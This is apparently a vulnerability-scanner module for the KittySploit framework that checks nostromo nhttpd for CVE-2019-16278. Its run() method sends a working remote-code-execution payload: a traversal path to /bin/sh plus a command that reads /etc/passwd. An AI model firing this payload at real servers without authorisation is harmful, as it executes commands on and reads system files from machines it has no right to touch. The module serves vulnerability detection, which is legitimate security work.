#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""nostromo nhttpd through 1."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'nostromo 1.9.6 - Remote Code Execution Detection',
        'description': 'nostromo nhttpd through 1.9.6 allows an attacker to achieve remote code execution via directory traversal in the function http_verify.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2019', 'edb', 'rce', 'packetstorm', 'nazgul', 'kev', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://packetstormsecurity.com/files/155802/nostromo-1.9.6-Remote-Code-Execution.html',
            'https://www.exploit-db.com/raw/47837',
            'https://nvd.nist.gov/vuln/detail/CVE-2019-16278',
            'http://www.nazgul.ch/dev/nostromo_cl.txt',
            'http://packetstormsecurity.com/files/155045/Nostromo-1.9.6-Directory-Traversal-Remote-Command-Execution.html',
        ],
        'cve': 'CVE-2019-16278',
    }

    def run(self):
        path = '/.%0d./.%0d./.%0d./.%0d./bin/sh'
        r = self.http_request(method='POST', path=path, allow_redirects=False, data='echo\necho\ncat /etc/passwd 2>&1\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:',)
        if any(re.search(rx, body) for rx in body_regexes):
            self.set_info(severity='critical', reason='nostromo 1.9.6 - Remote Code Execution detected', path=path)
            return True
        return False

